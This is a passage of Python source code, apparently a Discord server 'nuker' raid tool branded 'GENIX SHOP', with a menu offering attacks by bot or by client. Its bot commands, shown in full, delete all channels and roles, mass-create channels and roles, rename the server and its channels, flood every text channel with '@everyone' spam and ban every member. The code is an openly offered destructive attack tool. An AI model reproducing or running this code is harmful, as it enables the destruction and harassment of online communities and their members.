		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}bomb <message> <ammo> | Spam Message"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}rs <name> | Change Server Nickname"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}rc <name> | Change Channels Nickname"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}auto | Auto Spam Discord Server"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}close | Close ALL"))
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}start | Ban ALL"))
		print()
	
	@bot.command()
	async def cc(ctx, name:str=None, jam:int=None):
		if (name == None or jam == None):
			await ctx.message.delete()
			for i in range(30):
				threading.Thread(target=create, args=[token,ctx.guild.id,"GENIX SHOP"]).start()
		else:
			await ctx.message.delete()
			for i in range(jam):
				threading.Thread(target=create, args=[token,ctx.guild.id,name]).start()
			
	@bot.command()
	async def close(ctx):
		await ctx.message.delete()
		os._exit(0)
			
	@bot.command()
	async def dr(ctx):
		await ctx.message.delete()
		for role in ctx.guild.roles:
			try:
				threading.Thread(target=delete_roles(token,ctx.guild.id,role.id)).start()
			except:
				pass
	
	@bot.command()
	async def cr(ctx, name:str=None, jam:int=None):
		if (name == None or jam == None):
			await ctx.message.delete()
			for i in range(20):
				threading.Thread(target=create_roles, args=[token,ctx.guild.id,"GENIX SHOP"]).start()
		else:
			await ctx.message.delete()
			for i in range(jam):
				threading.Thread(target=create_roles, args=[token,ctx.guild.id,name]).start()
		
	@bot.command()
	async def rr(ctx, name=None):
		if (name == None):
			await ctx.message.delete()
			for role in ctx.guild.roles:
				try:
					threading.Thread(target=edit_roles, args=[token,ctx.guild.id,role.id,"GENIX SHOP"]).start()
				except:
					pass
		else:
			await ctx.message.delete()
			for role in ctx.guild.roles:
				try:
					threading.Thread(target=edit_roles, args=[token,ctx.guild.id,role.id,name]).start()
				except:
					pass
		
	@bot.command()
	async def bomb(ctx, msg:str=None, jam:int=None):
		if (msg == None or jam == None):
			await ctx.message.delete()
			for ch in ctx.guild.text_channels:
				try:
					for i in range(10):
						threading.Thread(target=send, args=[token,ch.id,"@everyone **BY GENIX SHOP** @here"]).start()
				except:
					pass
		else:
			await ctx.message.delete()
			for ch in ctx.guild.text_channels:
				try:
					for i in range(jam):
						threading.Thread(target=send, args=[token,ch.id,msg]).start()
				except:
					pass
					
	@bot.command()
	async def rs(ctx, name=None):
		if (name == None):
			await ctx.message.delete()
			threading.Thread(target=edit_server, args=[token,ctx.guild.id,"GENIX SHOP"]).start()
		else:
			await ctx.message.delete()
			threading.Thread(target=edit_server, args=[token,ctx.guild.id,name]).start()
		
	@bot.command()
	async def rc(ctx, name=None):
		if (name == None):
			await ctx.message.delete()
			for chann in ctx.guild.channels:
				try:
					threading.Thread(target=edit_channels, args=[token,chann.id,"GENIX SHOP"]).start()
				except:
					pass
		else:
			await ctx.message.delete()
			for chann in ctx.guild.channels:
				try:
					threading.Thread(target=edit_channels, args=[token,chann.id,name]).start()
				except:
					pass
					
	@bot.command()
	async def auto(ctx):
		await ctx.message.delete()
		edit_server(token,ctx.guild.id,"GENIX SHOP")
		for channel in ctx.guild.channels:
			try:
				threading.Thread(target=delete, args=[token,channel.id]).start()
			except:
				pass
		for i in range(30):
			try:
				threading.Thread(target=create, args=[token,ctx.guild.id,"GENIX SHOP"]).start()
			except:
				pass
				
	@bot.command()
	async def start(ctx):
		await ctx.message.delete()
		for members in ctx.guild.members:
			threading.Thread(target=bans, args=[token,ctx.guild.id,members.id]).start()
			
		
	try:
		bot.run(token)
	except:
		print()
		print(Colorate.Horizontal(Colors.green_to_cyan, "             [!] ERROR INVILD FOR TOKENS. "))
		time.sleep(2)
		botattack()
	
	
def clear():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")


def homepage():
	clear()
	print(banner)
	print()
	print(Colorate.Horizontal(Colors.yellow_to_red, "    [#] Please select the option you want : "))
	print()
	print(Colorate.Diagonal(Colors.rainbow, "           [01] ATTACK WITH BOT        [02] ATTACK WITH CLIENT"))
	print()
	print(Colorate.Diagonal(Colors.blue_to_red, "                             [00] Exit"))
	print()
	select = input(Colorate.Horizontal(Colors.green_to_cyan, "    SELECT MODE : "))
	if (select == "01" or select == "1"):
		botattack()
	elif (select == "02" or select == "2"):
		clientattack()
	elif (select == "00" or select == "0"):
		print("\n")
		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  Good Byeeeeee :)"))
	else:
		homepage()
	
homepage()


